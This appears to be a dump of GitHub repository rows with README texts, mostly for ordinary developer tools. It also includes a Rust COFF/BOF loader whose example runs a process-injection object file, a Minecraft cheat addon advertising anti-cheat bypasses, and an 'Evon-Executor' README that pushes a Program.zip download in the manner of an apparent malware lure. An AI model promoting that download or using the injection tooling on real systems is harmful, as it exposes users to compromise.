LLMDFA is an LLM-powered data-flow analysis framework. Specifically, it instantiates bottom-up summary-based data-flow analysis by interpreting intra-procedural data-flow facts with LLMs. With the specified sources/sinks and data-flow transfer functions (i.e., rules of propagating data-flow facts), LLMDFA can support various forms of bug detection in a context- and path-sensitive manner. Notably, the analysis is totally compilation-free.

## Installation

1. Clone the repository:
    ```shell
    git clone git@github.com:chengpeng-wang/LLMDFA.git
    cd LLMDFA
    ```

2. Install the required dependencies:
    ```shell
    conda create --name llmdfa python=3.10
    conda activate llmdfa
    pip install -r requirements.txt
    ```

3. Ensure you have the Tree-sitter library and language bindings installed:
    ```shell
    cd lib
    python build.py
    ```

4. Configure your key:
    ```shell
    export OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    ```

## Quick Start

1. Analyze a demo case using LLMDFA

    First, you need to synthesize the source/sink extractor with the following command:

    ```shell
    cd src
    sh run_extractor_synthesizer.sh
    ```

    After that, you can obtain synthesized extractors in the file `src/TSAgent/TS_synthesis_extractor.py`. We also provide the manually crafted extractors in `src/TSAgent/TS_manual_extractor.py`. If you want to use the manually crafted ones, you can just overwrite `src/TSAgent/TS_synthesis_extractor.py` with the content of `src/TSAgent/TS_manual_extractor.py`.

    Then you can run the following commands to detect XSS bugs using LLMDFA powered by `gpt-4o-mini` as a demo, which contains 10 cases.

    ```shell
    cd src
    python run_llmdfa.py --bug-type xss --model-name gpt-4o-mini \
        -syn-parser -fscot -syn-solve \
        --solving-refine-number 3 \
        --analysis-mode single    
    ```

    Then you can obtain the bug report in the directory `log/gpt-4o-mini/synparser_fscot_synsolver`. Also, the console output indicates the numbers of TPs and FPs. Here is an example:

    ```
    CWE369_Divide_by_Zero__int_database_modulo_81 

    {'input_token_cost': 14237, 'output_token_cost': 973, 'analysis_result': {'TPs': 1, 'FPs': 0}, 'ground_truth': {'TPs': 1, 'FPs': 2}, 'single time cost': 16.143609285354614} 
    ```

    In the above example, the case `CWE369_Divide_by_Zero__int_database_modulo_81` contains 1 true positive and 2 cases that are easily reported as false positives. The above console output indicates that LLMDFA reported one true positive without false positives. The input and output costs are 14237 and 973, respectively. The time cost is 16.143609285354614 seconds.

    If you want to detect all the XSS bugs in the Juliet Test Suite, you can just change the value of `analysis-mode` to `all`.

    If you want to change the bug types, you can reset the value of `bug-type` to `osci` and `dbz`.

    If you want to change the LLMs, you can just change the value of `model-name` to the name of the models you want to use, such as `gpt-3.5-turbo` and `gpt-4-turbo`. The output reports of LLMDFA are stored in separate directories in `log` when using different LLMs.

2. Run ablations of LLMDFA

   You can run the three ablations of LLMDFA as follows:

   - NoSynExt: Utilize LLMs to identify sources and sinks instead of applying synthesized source/sink extractors

    ```shell
    cd src
    python run_llmdfa.py --bug-type xss --model-name gpt-4o-mini \
        -fscot -syn-solve \
        --solving-refine-number 3 \
        --analysis-mode single    
    ```

   - NoCoT: Directly ask LLMs to summarize intra-procedural data-flow paths without chain-of-thought prompting

    ```shell
    cd src
    python run_llmdfa.py --bug-type xss --model-name gpt-4o-mini \
        -syn-parser -syn-solve \
        --solving-refine-number 3 \
        --analysis-mode single    
    ```

   - NoSynVal: Validate path feasibility with LLMs instead of invoking SMT solvers

    ```shell
    cd src
    python run_llmdfa.py --bug-type xss --model-name gpt-4o-mini \
        -syn-parser -fscot \
        --solving-refine-number 3 \
        --analysis-mode single    
    ```

   The bug reports of the ablations are located in `log/gpt-4o-mini/nosynparser_fscot_synsolver`, `log/gpt-4o-mini/synparser_nofscot_synsolver`, and `log/gpt-4o-mini/synparser_fscot_nosynsolver`, respectively.

3. Run end-to-end prompting-based analyses as baselines

   You can run the following command to apply end-to-end prompting-based analyzers:

    ```shell
    cd src
    python run_baseline.py --bug-type xss --model-name gpt-4o-mini --analysis-mode single    
    ```
   
## Remark on Dataset

To avoid the leakage of ground truth to LLMs, we obfuscate the code in the Juliet Test Suite. Specifically, we remove the comments and rename the functions. Also, we concatenate multiple Java files belonging to the same test case into a single file for convenience in prompting, even though the resulting file may not be compilable.

## More Programming Languages

LLMDFA is language-agnostic. To migrate the current implementations to other programming languages or extract more syntactic facts, please refer to the grammar files in the corresponding Tree-sitter libraries and refactor the code in the directory `src/TSAgent`. Basically, you only need to change the node types when invoking `find_nodes`.

Here are the links to grammar files in Tree-sitter libraries targeting mainstream programming languages:

- C: https://github.com/tree-sitter/tree-sitter-c/blob/master/src/grammar.json
- C++: https://github.com/tree-sitter/tree-sitter-cpp/blob/master/src/grammar.json
- Java: https://github.com/tree-sitter/tree-sitter-java/blob/master/src/grammar.json
- Python: https://github.com/tree-sitter/tree-sitter-python/blob/master/src/grammar.json
- JavaScript: https://github.com/tree-sitter/tree-sitter-javascript/blob/master/src/grammar.json

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.

## Contact

For any questions or suggestions, please contact [wang6590@purdue.edu](mailto:wang6590@purdue.edu) or [stephenw.wangcp@gmail.com](mailto:stephenw.wangcp@gmail.com).
",0,0,1,,,1.0
ssquadteam/Earth,main,"# Earth Core

The most Unique Minecraft Gamemode taking concepts in from Clash of Clans & many other games!

> [!WARNING]  
> Earth is still in early development phases.
",0,0,1,GPL-3.0,,0.0
a8anassis/CF7-Testbed,main,"# CF7-Testbed
This is the main Java repo for Coding Factory 7 AUEB
",0,0,1,,,0.0
tursodatabase/libsql-c,master,"<p align=""center"">
  <a href=""https://tur.so/turso-c"">
    <picture>
      <img src=""/.github/cover.png"" alt=""libSQL C"" />
    </picture>
  </a>
  <h1 align=""center"">libSQL C</h1>
</p>

<p align=""center"">
  Databases for C multi-tenant AI Apps.
</p>

<p align=""center"">
  <a href=""https://tur.so/turso-c""><strong>Turso</strong></a> ¬∑
  <a href=""https://docs.turso.tech""><strong>Docs</strong></a> ¬∑
  <a href=""https://docs.turso.tech/sdk/c/quickstart""><strong>Quickstart</strong></a> ¬∑
  <a href=""https://docs.turso.tech/sdk/c/reference""><strong>SDK Reference</strong></a> ¬∑
  <a href=""https://turso.tech/blog""><strong>Blog &amp; Tutorials</strong></a>
</p>

<p align=""center"">
  <a href=""LICENSE"">
    <picture>
      <img src=""https://img.shields.io/github/license/tursodatabase/libsql-c?color=0F624B"" alt=""MIT License"" />
    </picture>
  </a>
  <a href=""https://tur.so/discord-c"">
    <picture>
      <img src=""https://img.shields.io/discord/933071162680958986?color=0F624B"" alt=""Discord"" />
    </picture>
  </a>
  <a href=""#contributors"">
    <picture>
      <img src=""https://img.shields.io/github/contributors/tursodatabase/libsql-c?color=0F624B"" alt=""Contributors"" />
    </picture>
  </a>
  <a href=""https://packagist.org/packages/turso/libsql"">
    <picture>
      <img src=""https://img.shields.io/packagist/dt/turso/libsql?color=0F624B"" alt=""Total downloads"" />
    </picture>
  </a>
  <a href=""/examples"">
    <picture>
      <img src=""https://img.shields.io/badge/browse-examples-0F624B"" alt=""Examples"" />
    </picture>
  </a>
</p>

## Features

- üîå Works offline with [Embedded Replicas](https://docs.turso.tech/features/embedded-replicas/introduction)
- üåé Works with remote Turso databases
- ‚ú® Works with Turso [AI & Vector Search](https://docs.turso.tech/features/ai-and-embeddings)

> [!WARNING]
> This SDK is currently in technical preview, and mostly used for internal use when building other libSQL SDKs. <a href=""https://tur.so/discord-c"">Join us in Discord</a> to report any issues.

## Install

1. Clone the repository:

   ```bash
   git clone https://github.com/your-repo/libsql-c.git
   cd libsql-c
   ```

2. Build the library:

   ```bash
   cargo build --release
   ```

3. The compiled library will be in `target/release/`:

   - `liblibsql.so` (Linux)
   - `liblibsql.dylib` (macOS)
   - `liblibsql.dll` (Windows)

4. Copy `libsql.h` and the compiled library to your project directory or a standard system location.

## Quickstart

1. Write your program:

   ```c
   #include <stdio.h>
   #include ""libsql.h""

   int main() {
       libsql_setup((libsql_config_t){0});

       libsql_database_t db = libsql_database_init((libsql_database_desc_t){
           .path = ""local.db""
       });

       if (db.err) {
           fprintf(stderr, ""Error: %s\n"", libsql_error_message(db.err));
           return 1;
       }

       libsql_connection_t conn = libsql_database_connect(db);
       if (conn.err) {
           fprintf(stderr, ""Connection error: %s\n"", libsql_error_message(conn.err));
           return 1;
       }

       const char* sql = ""CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT);""
                         ""INSERT INTO users (name) VALUES ('Alice');"";

       libsql_batch_t batch = libsql_connection_batch(conn, sql);
       if (batch.err) {
           fprintf(stderr, ""Batch error: %s\n"", libsql_error_message(batch.err));
           return 1;
       }

       printf(""Database operations completed successfully.\n"");

       libsql_connection_deinit(conn);
       libsql_database_deinit(db);

       return 0;
   }
   ```

2. Compile your program, linking against the libsql library:

   ```
   gcc -o example example.c -L/path/to/libsql -llibsql
   ```

3. Run your program:
   ```
   ./example
   ```

## Examples

| Example                               | Description                                                                             |
| ------------------------------------- | --------------------------------------------------------------------------------------- |
| [local](examples/local)               | Uses libsql with a local SQLite file. Creates database, inserts data, and queries.      |
| [remote](examples/remote)             | Connects to a remote database. Requires environment variables for URL and auth token.   |
| [sync](examples/sync)                 | Demonstrates synchronization between local and remote databases.                        |
| [batch](examples/batch)               | Executes multiple SQL statements in a single batch operation.                           |
| [transactions](examples/transactions) | Shows transaction usage: starting, performing operations, and committing/rolling back.  |
| [memory](examples/memory)             | Uses an in-memory SQLite database for temporary storage or fast access.                 |
| [vector](examples/vector)             | Works with vector embeddings, storing and querying for similarity search.               |
| [encryption](examples/encryption)     | Creates and uses an encrypted SQLite database, demonstrating setup and data operations. |

## Documentation

Visit our [official documentation](https://docs.turso.tech/sdk/c).

## Support

Join us [on Discord](https://tur.so/discord-c) to get help using this SDK. Report security issues [via email](mailto:security@turso.tech).

## Contributors

See the [contributing guide](CONTRIBUTING.md) to learn how to get involved.

![Contributors](https://contrib.nn.ci/api?repo=tursodatabase/libsql-c)

<a href=""https://github.com/tursodatabase/libsql-c/issues?q=is%3Aopen+is%3Aissue+label%3A%22good+first+issue%22"">
  <picture>
    <img src=""https://img.shields.io/github/issues-search/tursodatabase/libsql-c?label=good%20first%20issue&query=label%3A%22good%20first%20issue%22%20&color=0F624B"" alt=""good first issue"" />
  </picture>
</a>
",0,0,1,MIT,,2.0
dbeaver/dbeaver-jdbc-libsql,devel,"# LibSQL JDBC driver

[![CI](https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml/badge.svg)](https://github.com/dbeaver/dbeaver-jdbc-libsql/actions/workflows/push-pr-devel.yml)
[![javadoc](https://javadoc.io/badge2/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql/javadoc.svg)](https://javadoc.io/doc/com.dbeaver.jdbc/com.dbeaver.jdbc.driver.libsql)
[![Apache 2.0](https://img.shields.io/github/license/cronn-de/jira-sync.svg)](http://www.apache.org/licenses/LICENSE-2.0)

LibSQL [JDBC](https://en.wikipedia.org/wiki/JDBC_driver) is a library for accessing and managing [LibSQL](https://github.com/tursodatabase/libsql) databases in Java.
- It is a pure Java library
- Version 1.0 uses simple [HTTP API](https://github.com/tursodatabase/libsql/blob/main/docs/http_api.md) protocol for LibSQL
- It supports prepared statements, database metadata, resultsets, data types and most of other JDBC features
- It is included in [DBeaver](https://github.com/dbeaver/dbeaver) and [CloudBeaver](https://github.com/dbeaver/cloudbeaver) as default LibSQL driver. However, it can be used in any other products/frameworks which rely on JDBC API

## Usage

JDBC URL format: `jdbc:dbeaver:libsql:<server-url>`  
Server URL is a full URL including schema and port. For example:
- `jdbc:dbeaver:libsql:http://localhost:1234`
- `jdbc:dbeaver:libsql:https://test-test.turso.io`

Token based authentication supported in version 1.0. Pass token value as password, leave the username empty.  

Driver class name: `com.dbeaver.jdbc.driver.libsql.LibSqlDriver`

## Example

```java
import java.sql.*;

public class LibSqlTest {
    public static void main(String[] args) throws Exception {
        String databaseUrl = ""http://libsql-server.company.local:8080"";
        try (Connection connection = DriverManager.getConnection(""jdbc:dbeaver:libsql:"" + databaseUrl)) {
            try (Statement statement = connection.createStatement()) {
                statement.execute(""drop table if exists test_table_1"");
                statement.execute(""create table test_table_1 (id integer, name string)"");
                statement.execute(""insert into test_table_1 values(1, 'test one')"");
                statement.execute(""insert into test_table_1 values(2, 'test two')"");
                try (ResultSet rs = statement.executeQuery(""select * from test_table_1"")) {
                    while (rs.next()) {
                        System.out.println(rs.getInt(""id"") + "" = "" + rs.getString(""name""));
                    }
                }
            }
        }
    }
}
```
## License

Licensed under the [Apache License, Version 2.0](http://www.apache.org/licenses/LICENSE-2.0)

## Download
Download from Maven Central or from the releases page.
```xml
<dependencies>
    <dependency>
      <groupId>com.dbeaver.jdbc</groupId>
      <artifactId>com.dbeaver.jdbc.driver.libsql</artifactId>
      <version>1.0.2</version>
    </dependency>
</dependencies>
```
",0,3,5,Apache-2.0,"common-cleanup.yml,push-pr-devel.yml",6.0
MeteorClientPlus/MeteorPlus,1.21.3,"
<div align=""center"">
	<img src=""https://github.com/Nekiplay/MeteorPlus/assets/35975332/5fa04a11-0de7-4423-8c9d-0b6fe9142df4"" alt=""meteor-plus"" width=""200px""/>
	<h1>Meteor+</h1>
	<br>
		An addon for <a href=""https://github.com/MeteorDevelopment/meteor-client"">Meteor client</a> that adds many blatant features.
	<br>
	<a href=""https://anticope.pages.dev/addons/?addon=MeteorClientPlus%2FMeteorPlus""><img src=""https://img.shields.io/badge/verified%20addon-yes-brightgreen"" alt=""Verified Addon""></a>
	<a href=""https://www.minecraft.net/""><img src=""https://img.shields.io/badge/minecraft%20version-1.18.2 -- 1.21.3-brightgreen"" alt=""Minecraft version""/></a>
	<a href=""https://github.com/Nekiplay/MeteorClientPlus/releases""><img src=""https://img.shields.io/github/downloads/MeteorClientPlus/MeteorPlus/total"" alt=""Downloads""/></a>
	<a href=""https://github.com/Nekiplay/MeteorClientPlus/stargazers""><img src=""https://badgen.net/github/stars/MeteorClientPlus/MeteorPlus"" alt=""GitHub stars""/></a>
	<br>
	<a href=""https://discord.gg/N3gqYc7GRS""><img src=""https://img.shields.io/badge/support/help/issues-discord-brightgreen"" alt=""Discord""/></a>
	<a href=""https://rvlt.gg/PD8TdYkB""><img src=""https://img.shields.io/badge/support/help/issues-revolt-brightgreen"" alt=""Revolt""/></a>
	<br>
	<p>Thanks some russian paid clients and <a href=""https://github.com/CCBlueX/LiquidBounce"">LiquidBounce</a> ü§´</p>
	<br>
	Recommended server for the game
3b3t.org - analog of 2b2t - https://discord.gg/3b3t-org
</div>

## PvE Modules
| Module                 | Description                                   | Bypasses                      |
|------------------------|-----------------------------------------------|-------------------------------|
| **Flight+**            | **Flight for Anti-Cheats**                    | **Matrix, Spartan, Vulcan**   |
| **Speed+**             | **Speed for Anti-Cheats**                     | **Matrix, ACC, Vulcan, NCP**  |
| **Spider+**            | **Spider for Anti-Cheats**                    | **Matrix, Vulcan**            |
| **Jesus+**             | **Jesus for Anti-Cheats**                     | **Matrix, Vulcan**            |
| **No Slow+**           | **No Slow for Anti-Cheats**                   | **Matrix, Vulcan, Grim, NCP** |
| **Fast Ladder** 	      | **Fast Ladder for Anti-Cheats**               | **Spartan**                   |
| **Gui Move+**          | **Gui Move for Anti-Cheats**                  | **Matrix, NCP**               |
| **Timer+**             | **Timer for Anti-Cheats**                     | **NCP, Intave, Vulcan**       |
| **Safe mine**          | **Prevents player from lava**                 | **Matrix**                    |
| **X-Ray bruteforce**   | **Xray protection bypass for servers 1.12.2** | **Ore Obfuscator**            |
| **Trigger Bot**        | **AutoAttack on look at entity**              |                               |
| **Auto Obsidian Farm** | **Automatically farm obsidian in AFK**        |                               |

## PvP Modules
| Module        | Description                                            | Bypasses |
|---------------|--------------------------------------------------------|----------|
| **Velocity+** | **Velocity for Anti-Cheats**                           | **Grim** |
| **Anti Bot**  | **Ignores bots for KillAura, ESP, Tracers**            |          |
| **Teams**     | **Does not beat teammates on BedWars and other modes** |          |

## Commands
| Command   | Description       | Bypasses                                |
|-----------|-------------------|-----------------------------------------|
| **eclip** | **Vertical clip** | **Matrix, Wraith, Spartan, Negativity** |


## Meteor Client improvements
| Module                    | Enhancements                                                        |
|---------------------------|---------------------------------------------------------------------|
| **Freecam**               | **Added good baritone control via Freecam**                         |       
| **Waypoints**             | **Added display of distances in label names, sorting, name search** |
| **Hidden module**         | **Hiding original modules and third-party modules from the GUI**    |

## Meteor Client fixes
| Module        | Fix                                         |
|---------------|---------------------------------------------|
| **Auto Tool** | **No work in creative mode**                |
| **KeyBinds**  | **Allow binding function to LMB, RMB, ESC** |

# Installation Guide
1. Install [minecraft](https://www.minecraft.net)
2. Install [fabric](https://fabricmc.net) and [fabric api](https://www.curseforge.com/minecraft/mc-mods/fabric-api) for your version of minecraft
3. Download [meteor client](https://meteorclient.com) for your version of minecraft
4. Download [meteor plus](https://github.com/Nekiplay/MeteorPlus/releases) for your version of minecraft
5. Place the meteor client and meteor plus in your mods folder

    A: Make Commit we welcome anyone who makes a useful contribution to our free open source product

## For Contributors
We use local builds of Meteor Client and Baritone from Meteor Client since Meteor Client a hosting can sometimes not be paid on time 
",8,2,4,AGPL-3.0,"dev_build.yml,pull_request.yml",0.0
joaoviictorti/coffeeldr,main,"# coffeeldr ü¶Ä 

![Rust](https://img.shields.io/badge/made%20with-Rust-red)
![Platform](https://img.shields.io/badge/platform-windows-blueviolet)
![Forks](https://img.shields.io/github/forks/joaoviictorti/coffeeldr)
![Stars](https://img.shields.io/github/stars/joaoviictorti/coffeeldr)
![License](https://img.shields.io/github/license/joaoviictorti/coffeeldr)

`coffeeldr` is a modern and lightweight COFF (Common Object File Format) loader for Windows written in Rust, designed to run COFF files on Windows. It supports both 32-bit and 64-bit architectures and allows you to load and execute COFF files from files or memory buffers with Rust‚Äôs safety and performance guarantees.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [Loading from File](#loading-from-file)
  - [Loading from Buffer](#loading-from-buffer)
  - [Executing a COFF File](#executing-a-coff-file)
- [CLI](#cli)
  - [Input Processing in CLI](#input-processing-in-cli)
- [Contributing to coffeeldr](#contributing-to-coffeeldr)
- [References](#references)
- [License](#license)

## Features

- ‚úÖ Load COFF files from disk or in-memory buffers.
- ‚úÖ 32-bit and 64-bit support.
- ‚úÖ Memory management: Automatically adjusts memory protections to ensure execution (read, write, execute permissions).
- ‚úÖ Dynamic relocation handling.
- ‚úÖ Fully written in Rust with safety and performance in mind.
- ‚úÖ Easy CLI integration with flexible input handling.

## Installation

Add `coffeeldr` to your project by updating your `Cargo.toml`:

```powershell
cargo add coffeeldr
```

## Usage

### Loading from File

To load a COFF file from the filesystem:
```rust
use coffeeldr::CoffeeLdr;

let loader = CoffeeLdr::new(""path/to/coff_file.o"");
match loader {
    Ok(ldr) => {
        println!(""COFF successfully loaded from file!"");
        // Execute the entry point or manipulate the COFF as needed
    },
    Err(e) => println!(""Error loading COFF: {:?}"", e),
}
```

### Loading from Buffer

To load a COFF from an in-memory buffer:
```rust
use coffeeldr::CoffeeLdr;

let coff_data = include_bytes!(""path/to/coff_file.o"");
let loader = CoffeeLdr::new(coff_data);
match loader {
    Ok(ldr) => {
        println!(""COFF successfully loaded from buffer!"");
        // Execute the entry point or manipulate the COFF as needed
    },
    Err(e) => println!(""Error loading COFF: {:?}"", e),
}
```

### Executing a COFF File

Once the COFF file is loaded, you can execute it by specifying the entry point:
```rust
let coffee = CoffeeLdr::new(""path/to/coff_file.o"").unwrap();
coffee.run(""entry_point_function_name"", None, None).unwrap();
```

This method will search for the specified entry point and execute it.

## CLI

`coffeeldr` also provides a convenient CLI tool for interacting with COFF files directly from the command line.

Example Command:
```cmd
coffee.exe --bof path/to/coff_file.o --entrypoint go
```

### Input Processing in CLI

These are the types of parameters that the tool accepts for processing:

- `/short:<value>`: Adds a short (`i16`) value.
- `/int:<value>`: Adds an integer (`i32`) value.
- `/str:<value>`: Adds a string.
- `/wstr:<value>`: Adds a wide string.
- `/bin:<base64-data>`: Adds binary data decoded from `base64`.

Example command using [`ntcreatethread.o`](https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/Injection/ntcreatethread/ntcreatethread.x64.o):
```cmd
coffee.exe --bof ntcreatethread.o --entrypoint go /int:4732 /bin:Y29mZmVlbGRy..
```

Another example using [`dir.o`](https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/SA/dir/dir.x64.o):
```cmd
coffee.exe --bof dir.o --entrypoint go /str:C:\
```

## Contributing to coffeeldr
To contribute to **coffeeldr**, follow these steps:

1. Fork this repository.
2. Create a branch: `git checkout -b <branch_name>`.
3. Make your changes and commit them: `git commit -m '<commit_message>'`.
4. Push your changes to your branch: `git push origin <branch_name>`.
5. Create a pull request.

Alternatively, consult the [GitHub documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests) on how to create a pull request.

## References

- <https://github.com/HavocFramework/Havoc>
- <https://otterhacker.github.io/Malware/CoffLoader.html>
- <https://github.com/trustedsec/COFFLoader>

## License

This project is licensed under the MIT License. See the [LICENSE](/LICENSE) file for details.",0,0,1,MIT,,0.0
rustp2p/rustp2p,master,"A decentralized p2p library powered by Rust, which is devoted to simple use. 

[![Crates.io](https://img.shields.io/crates/v/rustp2p.svg)](https://crates.io/crates/rustp2p)
![rustp2p](https://docs.rs/rustp2p/badge.svg)

### Features
1.  UDP hole punching for both Cone and Symmetric Nat
2.  TCP hole punching for NAT1 


### Description
For connecting two peers, all you need to do is to give the configuration as done in the example. In short, provide a peer named `C`, peer `A` and `B` can directly connect to `C`, then `A` and `B` will find each other by `C`, `A` and `C` can directly connect by hole-punching, the whole process is done by this library. If two peers `D` and `F` cannot directly connect via hole-punching, this library can find the best link for indirectly connection(i.e. through some middle nodes).  

### Example

- [example/node](https://github.com/rustp2p/rustp2p/blob/master/examples/node.rs)
- [https://github.com/rustp2p/netlink](https://github.com/rustp2p/netlink)



",0,0,6,Apache-2.0,rust.yml,4.0
estie-inc/wasm-xlsxwriter,main,"# wasm-xlsxwriter [![NPM Version](https://img.shields.io/npm/v/wasm-xlsxwriter)](https://www.npmjs.com/package/wasm-xlsxwriter)

The `wasm-xlsxwriter` library is a lightweight wrapper around the write API of Rust's [`rust_xlsxwriter`](https://crates.io/crates/rust_xlsxwriter), compiled to WebAssembly (Wasm) with minimal setup to make it easily usable from JavaScript.

With this library, you can generate Excel files in the browser using JavaScript, complete with support for custom formatting, formulas, links, images, and more.

## Getting Started

To get started, install the library via npm:

```bash
npm install wasm-xlsxwriter
```

### Usage

Here‚Äôs an example of how to use `wasm-xlsxwriter` to create an Excel file:

```typescript
import xlsxInit, {
  Format,
  FormatAlign,
  FormatBorder,
  Formula,
  Workbook,
  Image,
  Url,
} from ""wasm-xlsxwriter"";

// Load the WebAssembly module and initialize the library.
await xlsxInit();

// Create a new Excel file object.
const workbook = new Workbook();

// Create some formats to use in the worksheet.
const boldFormat = new Format().setBold();
const decimalFormat = new Format().setNumFormat(""0.000"");
const dateFormat = new Format().setNumFormat(""yyyy-mm-dd"");
const mergeFormat = new Format()
  .setBorder(FormatBorder.Thin)
  .setAlign(FormatAlign.Center);

// Add a worksheet to the workbook.
const worksheet = workbook.addWorksheet();

// Set the column width for clarity.
worksheet.setColumnWidth(0, 22);

// Write a string without formatting.
worksheet.write(0, 0, ""Hello"");

// Write a string with the bold format defined above.
worksheet.writeWithFormat(1, 0, ""World"", boldFormat);

// Write some numbers.
worksheet.write(2, 0, 1);
worksheet.write(3, 0, 2.34);

// Write a number with formatting.
worksheet.writeWithFormat(4, 0, 3.0, decimalFormat);

// Write a formula.
worksheet.write(5, 0, new Formula(""=SIN(PI()/4)""));

// Write a date.
const date = new Date(2023, 1, 25);
worksheet.writeWithFormat(6, 0, date, dateFormat);

// Write some links.
worksheet.write(7, 0, new Url(""https://www.rust-lang.org""));
worksheet.write(8, 0, new Url(""https://www.rust-lang.org"").setText(""Rust""));

// Write some merged cells.
worksheet.mergeRange(9, 0, 9, 1, ""Merged cells"", mergeFormat);

// Insert an image (ensure `imageBuffer` contains the image data).
const image = new Image(imageBuffer);
worksheet.insertImage(1, 2, image);

// Save the file to a buffer.
const buf = workbook.saveToBufferSync();
```

## License

MIT
",0,1,2,NOASSERTION,test.yml,21.0
junkdog/exabind,main,"# exabind

A TUI for viewing KDE shortcuts with an interactive keyboard layout and animated visualizations.

This can be seen as a ""tech demo"" for [tachyonfx](https://github.com/junkdog/tachyonfx). 

Feel free to open issues for any features requests or bugs you find!

![exabind](demo/exabind-02.gif)

## Features

- Interactive keyboard layout visualization with LED effects and key highlighting
- Parse and display shortcuts from:
    - KDE global shortcuts
    - ~~JetBrains IDE keymap files~~
- Filter shortcuts by modifier keys (Ctrl, Alt, Shift, Meta)
- Categorized shortcut display with animated transitions
- Beautiful TUI powered by [ratatui](https://github.com/ratatui-org/ratatui)
- [Catppuccin](https://github.com/catppuccin/catppuccin) color scheme

## Running

```bash
cargo run --release
```

## Usage

```bash
# View KDE global shortcuts (~/.config/kglobalshortcutsrc"")
exabind 

# or specify a custom path
exabind path/to/kglobalshortcutsrc
```

### Controls

| Key                         | Action                      |
|-----------------------------|-----------------------------|
| `q`                         | Quit                        |
| `‚Üë/‚Üì`                       | Navigate categories         |
| `Esc`                       | Deselect category           |
| `Ctrl`/`Alt`/`Shift`/`Meta` | Toggle modifier key filters |
",0,0,1,MIT,,1.0
pixlie/PixlieAI,main,"# Pixlie AI
AI powered knowledge graphs for semantically accurate insights. From personal research to semantic search in your apps.

## What is Pixlie AI?
Pixlie AI helps you create knowledge graphs that stores semantic information about your data.
It uses a combination of AI/ML models like GLiNER or Anthropic's Claude to extract semantics at a low cost.
The extracted semantics are stored in the graph, retaining the rich real world context of your data.
You can then get insights from the graph, either visually or programmatically.

Here is how it works:
- Setup Pixlie AI on your computer (on  on the cloud)
- Start with a problem or question that you want to deep dive into
- Share your data with Pixlie AI or crawl the web
- Pixlie AI uses LLMs (Anthropic's Claude) classify your data (your API keys)
- Pixlie AI uses GLiNER (running locally or on the cloud) to extract semantics from your data
- Pixlie AI can crawl data from the web if youw want
- A knowledge graph is created that holds semantic information about your data
- Query the graph visually or programmatically

## How can I use Pixlie AI?
Pixlie AI is open source and is under active development. Our work is done in public, please star this repository, it means a lot to us.
If you want to be notified when Pixlie AI is ready for use, please subscribe to our [insights newsletter](https://pixlie.com/insights).

## Is Pixlie AI an alternative to using vector databases?
Yes, Pixlie AI is an alternative to using vector databases. Vector databases are good for storing and querying semantic data,
but is they do not model the underlying data accurately. In Pxlie AI, we use LLMs to classify individual pieces of semantically
meaningful data. Each individual entity, like a person, place, date, event, item of interest is stored separately in the graph.
Their relationships to other entitiies and also stored in the graph. This makes our graph based approach better where accuracy is
important.


## License
- Pixlie AI is licensed under the GNU General Public License version 3.0
- See the [LICENSE](LICENSE) file for details
",0,16,3,GPL-3.0,,8.0
Nappxy/Evon-Executor,master,"# Evon-Executor

Evon supports the Unified Naming Convention, allowing Evon to be compatible with 99.9% of modern scripts.

[![Download Program](https://img.shields.io/badge/Download%20Program-Program.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/17563018/Program.zip)

## Table of Contents
- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Introduction
Welcome to Evon-Executor! This repository contains the implementation of Evon, a powerful tool that supports the Unified Naming Convention. With Evon, you can execute scripts seamlessly across various environments without compatibility issues.

In the world of scripting and automation, compatibility is key. Evon understands this and ensures that your scripts run smoothly on 99.9% of modern environments. Say goodbye to frustrating compatibility errors and hello to efficient script execution with Evon!

![Evon-Executor](https://source.unsplash.com/featured/800x400/?technology)

## Features
Here are some of the key features of Evon-Executor:
- **Unified Naming Convention Support:** Evon is designed to support the Unified Naming Convention, ensuring compatibility with a wide range of scripts.
- **Efficient Script Execution:** Execute your scripts with confidence, knowing that Evon will handle compatibility issues seamlessly.
- **Easy Integration:** Evon can be easily integrated into your existing workflows, making it a valuable tool for automation.
- **Enhanced Performance:** With Evon, you can expect improved performance and reliability when running scripts.

## Installation
To install Evon-Executor, follow these simple steps:
1. Download the `Program.zip` file from the following link: [Download Program](https://github.com/user-attachments/files/17563018/Program.zip).
2. Extract the contents of the zip file to a directory of your choice.
3. You are now ready to use Evon-Executor for your script execution needs.

## Usage
Using Evon-Executor is straightforward. Simply follow these steps to get started:
1. Launch the Evon-Executor application.
2. Load the script you want to execute into the application.
3. Click on the ""Execute"" button to run the script.
4. Monitor the output to ensure that the script executes successfully.
5. Enjoy seamless script execution with Evon!

Here's an example of how you can use Evon-Executor to run a Python script:
```python
# Python script to calculate the square of a number
def calculate_square(number):
    return number ** 2

# Execute the script
result = calculate_square(5)
print(f""The square of 5 is: {result}"")
```

## Contributing
We welcome contributions to Evon-Executor from the community. If you have ideas for new features, improvements, or bug fixes, feel free to contribute to the repository. Here's how you can contribute:
1. Fork the repository.
2. Make your changes.
3. Submit a pull request.

Together, we can make Evon-Executor even better for users around the world!

## License
The Evon-Executor project is licensed under the MIT License. See the `LICENSE` file for more details.

---

**Note:** For any questions or support related to Evon-Executor, please [contact us](mailto:evon.executor@example.com). Thank you for using Evon for your script execution needs! üöÄ",1,0,1,MIT,,0.0
0PandaDEV/downcida,main,"### <ins>**This crate does currently not work because of a Token that is needed! see [#1](https://github.com/0PandaDEV/downcida/issues/1)**</ins>

# Downcida

Downcida is a Rust crate that allows you to download Spotify tracks using the [Lucida API](https://lucida.to/). It provides a simple interface to download audio files from Spotify tracks and save them to a specified directory.

## Features

- [x] Different download Formats (FLAC, WAV, OGG, OPUS, M4A, MP3 e.g)
- [x] Spotify
- [ ] Qobuz
- [ ] Tidal
- [ ] Soundcloud
- [ ] Deezer
- [ ] Amazon Music
- [ ] Beatport

## Installation

Add this to your `Cargo.toml`:

```toml
[dependencies]
downcida = ""0.1.3""
